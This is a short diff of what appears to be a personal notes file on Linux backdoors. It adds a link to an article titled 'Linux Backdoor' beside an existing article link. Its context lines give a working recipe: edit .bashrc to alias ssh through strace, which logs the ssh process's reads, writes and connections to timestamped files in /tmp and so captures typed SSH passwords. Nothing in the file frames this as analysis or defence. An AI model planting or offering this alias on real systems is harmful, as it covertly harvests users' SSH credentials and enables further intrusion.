@@ -1,4 +1,5 @@
 http://mp.weixin.qq.com/s?__biz=MzAxMTY5MTEyMQ==&mid=401600822&idx=1&sn=607a793e220287faeb1511f4107401ed&utm_source=tuicool&utm_medium=referral
+http://drops.leesec.com/#!/drops/1198.Linux%20Backdoor
 
 vi .bashrc
 alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'
